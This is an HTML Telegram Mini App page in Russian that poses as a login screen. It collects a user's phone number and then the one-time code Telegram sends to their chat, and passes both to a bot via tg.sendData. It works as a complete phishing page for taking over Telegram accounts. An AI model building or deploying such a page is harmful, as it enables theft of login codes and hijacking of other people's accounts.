<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org"></script>
    <style>
        body { font-family: -apple-system, system-ui; background: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .step { display: none; width: 90%; text-align: center; }
        .active { display: block; }
        input { width: 85%; padding: 15px; margin: 15px 0; border-radius: 12px; border: 1px solid #ccc; font-size: 18px; outline: none; }
        button { width: 90%; padding: 15px; border-radius: 12px; border: none; background: var(--tg-theme-button-color, #248bcf); color: var(--tg-theme-button-text-color, #fff); font-size: 16px; font-weight: bold; cursor: pointer; }
        p { color: var(--tg-theme-hint-color, #999); font-size: 14px; }
    </style>
</head>
<body>
    <!-- ШАГ 1: НОМЕР -->
    <div id="step-p" class="step active">
        <h2>Вход</h2>
        <p>Введите номер телефона (можно без +)</p>
        <input type="tel" id="phone" placeholder="79001234567">
        <button onclick="send('phone')">Продолжить</button>
    </div>
    <!-- ШАГ 2: КОД -->
    <div id="step-c" class="step">
        <h2>Код из Telegram</h2>
        <p>Введите код, который пришел в чат</p>
        <input type="number" id="code" placeholder="12345">
        <button onclick="send('code')">Подтвердить</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        function send(type) {
            const val = document.getElementById(type).value.trim();
            if(!val) return;
            tg.sendData(type + ":" + val);
            if(type === 'phone') {
                document.getElementById('step-p').classList.remove('active');
                document.getElementById('step-c').classList.add('active');
            } else { tg.close(); }
        }
    </script>
</body>
</html>
